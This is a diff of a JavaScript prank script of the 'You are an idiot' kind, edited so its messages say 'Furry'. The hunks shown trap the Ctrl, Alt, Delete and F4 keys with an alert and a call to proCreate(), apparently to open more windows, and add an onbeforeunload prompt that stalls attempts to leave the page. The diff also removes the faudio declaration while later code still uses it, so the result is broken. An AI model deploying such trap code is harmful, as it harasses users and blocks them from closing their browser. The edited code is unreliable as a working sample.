@@ -1,27 +1,5 @@
 /* [Oct 2021] Added to comply with strict browser policies. */
-document.addEventListener('click', musicPlay);
-
-function musicPlay() {
-    var audio = document.getElementById('youare-audio');
-	var micon = document.getElementById('youare-micon');
-	
-	micon.addEventListener('click', musicPlay);
-	
-	if (audio.duration > 0 && audio.paused) {
-		audio.play();
-		micon.src = "images/speaker.png";
-	}
-	else {
-		audio.pause();
-		audio.currentTime = 0;
-		
-		micon.src = "images/speakerm.png";
-	}
-	
-	document.removeEventListener('click', musicPlay);
-}
-
-var faudio = new Audio('youare.mp3')
+// this is made by endermanch, not me. i just edited it to be more furry (hi adan)
 
 faudio.addEventListener('timeupdate', function() {
 	console.log('TimeUpdate invoked.');
@@ -37,7 +15,7 @@ faudio.addEventListener('timeupdate', function() {
 function bookmark() {
 	if ((navigator.appName == "Microsoft Internet Explorer") && (parseInt(navigator.appVersion) >= 4)) {
 		var url = "lol.html";
-		var title = "Idiot!";
+		var title = "Furry!";
 		
 		window.external.AddFavorite(url, title);
 	}
@@ -128,7 +106,7 @@ window.onkeydown = function() {
 	var keyCode = event.keyCode;
 	
 	if (keyCode == 17 || keyCode == 18 || keyCode == 46 || keyCode == 115) {	
-		alert("You are an idiot!"); 
+		alert("You are a Furry!"); 
 		proCreate();
 	}
 	
@@ -136,6 +114,6 @@ window.onkeydown = function() {
 }
 
 window.onbeforeunload = function() {
-    return "Are you an idiot?";
+    return "Are you a Furry?";
 };
 /* [Oct 2021] End of amendments. */
